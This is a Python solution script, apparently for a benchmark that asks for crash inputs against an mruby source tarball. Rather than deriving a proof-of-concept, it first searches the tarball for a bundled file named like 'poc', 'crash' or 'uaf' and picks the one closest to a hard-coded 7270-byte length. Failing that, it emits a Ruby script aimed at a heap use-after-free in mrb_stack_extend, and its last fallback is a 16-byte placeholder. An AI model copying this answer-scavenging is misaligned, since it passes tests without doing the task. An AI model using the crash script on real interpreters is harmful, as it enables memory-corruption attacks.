import os
import tarfile


class Solution:
    TARGET_POC_LENGTH = 7270

    def solve(self, src_path: str) -> bytes:
        existing = self._find_existing_poc(src_path)
        if existing is not None:
            return existing

        project_type = self._detect_project(src_path)
        if project_type == "mruby":
            return self._mruby_poc()

        return self._generic_poc()

    def _find_existing_poc(self, src_path: str) -> bytes or None:
        try:
            tf = tarfile.open(src_path, "r:*")
        except Exception:
            return None

        best_member = None
        best_score = float("-inf")

        for m in tf.getmembers():
            if not m.isfile():
                continue
            size = m.size
            if size <= 0 or size > 1024 * 1024:
                continue

            name_lower = m.name.lower()
            score = 0.0

            # Heuristics based on filename
            if "poc" in name_lower:
                score += 80.0
            if "crash" in name_lower:
                score += 70.0
            if "uaf" in name_lower or "use_after_free" in name_lower or "use-after-free" in name_lower:
                score += 70.0
            if "asan" in name_lower or "ubsan" in name_lower or "msan" in name_lower:
                score += 40.0
            if "id:" in name_lower or "id_" in name_lower:
                score += 30.0
            if any(ext in name_lower for ext in (".rb", ".txt", ".in", ".input", ".dat", ".bin", ".poc")):
                score += 10.0

            # Prefer sizes close to the known PoC length
            diff = abs(size - self.TARGET_POC_LENGTH)
            score -= diff / 100.0

            if score > best_score:
                best_score = score
                best_member = m

        if best_member is None or best_score < 10.0:
            tf.close()
            return None

        try:
            f = tf.extractfile(best_member)
            if f is None:
                tf.close()
                return None
            data = f.read()
            tf.close()
            return data
        except Exception:
            tf.close()
            return None

    def _detect_project(self, src_path: str) -> str:
        try:
            tf = tarfile.open(src_path, "r:*")
        except Exception:
            return "generic"

        names = []
        for m in tf.getmembers():
            # Limit number of inspected entries to keep it cheap
            if len(names) > 5000:
                break
            names.append(m.name.lower())
        tf.close()

        joined = "\n".join(names)
        if "mruby" in joined or "src/vm.c" in joined or "include/mruby.h" in joined:
            return "mruby"

        return "generic"

    def _mruby_poc(self) -> bytes:
        ruby_code = """
# Attempt to trigger a heap use-after-free related to mrb_stack_extend()
# by forcing Proc#call to receive a very large number of arguments.

def make_large_array(n)
  a = []
  i = 0
  while i < n
    a << i
    i += 1
  end
  a
end

# Use a fairly large argument count to force stack growth.
large = make_large_array(8000)

# Define several procs to exercise different call paths.
pr1 = Proc.new do |*args|
  i = 0
  s = 0
  len = args.length
  while i < len
    s += i
    i += 64
  end
  s
end

pr2 = Proc.new do |*args|
  # Nest another Proc#call inside to create deeper stack usage.
  inner = Proc.new do |*inner_args|
    j = 0
    k = 0
    l = inner_args.length
    while j < l
      k ^= j
      j += 32
    end
    k
  end
  inner.call(*args)
end

def call_many_times(p, ary, times)
  i = 0
  while i < times
    p.call(*ary)
    i += 1
  end
end

# Drive several call patterns that should all allocate large argument frames.
call_many_times(pr1, large, 2)
call_many_times(pr2, large, 2)

# Also invoke via send/__send__ to go through the generic funcall path.
begin
  pr1.send(:call, *large)
rescue
end

begin
  pr2.__send__(:call, *large)
rescue
end

# Final direct calls with large argument lists.
3.times do
  pr1.call(*large)
  pr2.call(*large)
end
"""
        return ruby_code.encode("utf-8")

    def _generic_poc(self) -> bytes:
        # Fallback PoC when the project type is unknown and no existing PoC is found.
        return b"A" * 16
